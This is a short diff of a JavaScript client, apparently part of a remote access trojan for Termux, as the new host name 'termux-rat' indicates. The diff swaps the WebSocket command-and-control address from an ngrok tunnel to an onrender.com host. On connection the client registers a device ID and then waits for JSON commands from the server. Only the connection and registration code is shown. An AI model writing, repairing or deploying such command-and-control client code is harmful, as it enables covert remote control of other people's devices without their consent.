@@ -32,7 +32,7 @@ const DEVICE_ID = (() => {
   }
 })();
 
-const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");
+const ws = new WebSocket("wss://termux-rat.onrender.com");
 
 ws.on("message", (msg) => {
   const data = JSON.parse(msg.toString());
@@ -54,7 +54,8 @@ ws.on("message", (msg) => {
 
 ws.on("open", () => {
   ws.send(JSON.stringify({ type: "register_device", id: DEVICE_ID }));
-});
+  });
+
   
 
 /*
